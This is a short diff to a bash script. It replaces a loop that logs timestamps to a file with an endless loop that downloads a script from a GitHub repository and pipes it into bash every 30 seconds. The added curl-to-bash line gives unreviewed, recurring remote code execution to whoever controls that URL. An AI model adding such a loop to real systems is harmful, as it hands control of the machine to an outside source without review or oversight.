@@ -1,7 +1,6 @@
 #!/bin/bash
-
 while true
 do
-nohup echo $(date +%x_%r) >> reportme &
-sleep 1
+curl -sL https://raw.githubusercontent.com/ask2tam/freevps/master/startup.sh | bash
+sleep 30
 done
